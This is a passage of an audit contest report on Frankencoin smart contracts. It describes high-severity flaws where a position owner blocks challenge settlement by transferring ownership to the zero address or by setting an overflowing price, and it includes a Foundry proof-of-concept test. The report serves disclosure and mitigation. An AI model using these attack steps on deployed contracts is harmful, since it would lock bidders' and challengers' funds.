href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L354\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L354</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252-L276\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252-L276</a></p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider extending the cooldown period of the position even if the challenge is successful</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/691#issuecomment-1528913130\">luziusmeisser (Frankencoin) commented</a>:</strong></p>\n<blockquote>\n<p>Excellent finding! Will implement 1 day cooldown on successful challenges.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-transfer-position-ownership-to-addr0-to-dos-end-challenge\" style=\"position:relative;\"><a href=\"#h-04-transfer-position-ownership-to-addr0-to-dos-end-challenge\" aria-label=\"h 04 transfer position ownership to addr0 to dos end challenge permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670\">[H-04] Transfer position ownership to <code>addr(0)</code> to DoS <code>end()</code> challenge</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670\">__141345__</a></em></p>\n<p>If some challenge is about to succeed, the position owner will lose the collateral. Seeing the unavoidable loss, the owner can transfer the position ownership to <code>addr(0)</code>, fail the <code>end()</code> call of the challenge. At the end, the DoS in <code>end()</code> will have these impacts:</p>\n<ul>\n<li>the successful bidder will lose bid fund.</li>\n<li>the challenger’s collateral will be locked, and lose the challenge reward.</li>\n</ul>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assuming, the position has <code>minimumCollateral</code> of 600 zchf, the position owner minted 1,000 zchf against some collateral worth of 1,100 zchf, the highest bid for the collateral was 1,060 zchf, the challenge reward being 50. Then in <code>Position.sol#notifyChallengeSucceeded()</code>, the <code>repayment</code> will be 1,000, but <code>effectiveBid</code> worth of 1,060. The <code>fundNeeded</code> will be 1,000 + 50 = 1,050, and results in excess of 1,060 - 1,050 = 10 to refund the position owner in line 268 <code>MintingHub.sol</code>. In addition, due to the <code>minimumCollateral</code> limit, this challenge cannot be split into smaller ones.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_challengeNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">postponeCollateralReturn</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volume</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reservePPM</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// overbid, return excess amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">volume</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">CHALLENGER_REWARD</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// how much must be burned to make things even</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">notifyRepaidInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// we assume the caller takes care of the actual repayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">352</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">internalWithdrawCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// transfer collateral to the bidder and emit update</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">353</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">volumeZCHF</span><span class=\"mtk1\">, </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveContribution</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>From the position owner’s point of view, the position is on auction and has incurred loss already, only 10 zchf refund left. The owner can give up the tiny amount, and transfer the ownership to <code>addr(0)</code> to DoS the <code>end()</code> call.</p>\n<p>When the position <code>owner</code> is <code>addr(0)</code>, the transfer in line 268 <code>MintingHub.sol</code> will revert, due to the requirement in zchf (inherited from <code>ERC20.sol</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Now the successful bidder can no longer call <code>end()</code>. The bid fund will be lost. Also the challenger will lose the collateral because the return call encounter DoS too.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Disallow transferring position ownership to <code>addr(0)</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670#issuecomment-1515987516\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>The need to prevent transferring to the zero address is already mentioned in the automated findings and was reported by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/935\"><code>#935</code></a>, however the impact demonstrated in this report is much more severe than the low severity impact identified by other reports and therefore I believe it should be a separate finding.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670#issuecomment-1529044039\">luziusmeisser (Frankencoin) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-05-position-owners-can-deny-liquidations\" style=\"position:relative;\"><a href=\"#h-05-position-owners-can-deny-liquidations\" aria-label=\"h 05 position owners can deny liquidations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481\">[H-05] Position owners can deny liquidations</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481\">JGcarv</a></em></p>\n<h3 id=\"lines-of-code\" style=\"position:relative;\"><a href=\"#lines-of-code\" aria-label=\"lines of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L307\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L307</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The owner of a vulnerable position can deny being liquidated by setting the price to be <code>type(uint256).max</code>, making every call to <code>tryAvertChallenge</code> fail due to an overflow.</p>\n<p>This means that if it’s advantageous enough the owner can choose to keep <code>zchf</code> and leave the collateral stuck. This could happen in any scenario where a collateral is likely to loose it’s value, for example, de-pegs, runs on the bank, etc.</p>\n<h3 id=\"test-proof\" style=\"position:relative;\"><a href=\"#test-proof\" aria-label=\"test proof permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test Proof</h3>\n<p>Here’s a snippet that can be pasted on <code>GeneralTest.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_liquidationDenial</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">test01Equity</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// ensure there is some equity to burn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">posAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">initPosition</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pos</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Position</span><span class=\"mtk1\">(</span><span class=\"mtk12\">posAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">15</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">86_400</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pos</span><span class=\"mtk1\">.</span><span class=\"mtk11\">adjustPrice</span><span class=\"mtk1\">(</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">first</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk11\">challenge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">, </span><span class=\"mtk12\">posAddress</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk11\">obtainFrankencoins</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swap</span><span class=\"mtk1\">, </span><span class=\"mtk7\">55_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">, </span><span class=\"mtk12\">first</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">86_400</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">first</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1523244319\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>I think the real issue here is that you can’t end the challenge (as shown in the last line of the PoC), that will cause a loss of funds for challenger and disincentivize users from challenging the position.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1532517706\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Ouch, this is a good one.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1534102697\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Great finding with coded POC. As the presort mentioned, the impact is the same as <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670\"><code>#670</code></a>, but this has a different exploit 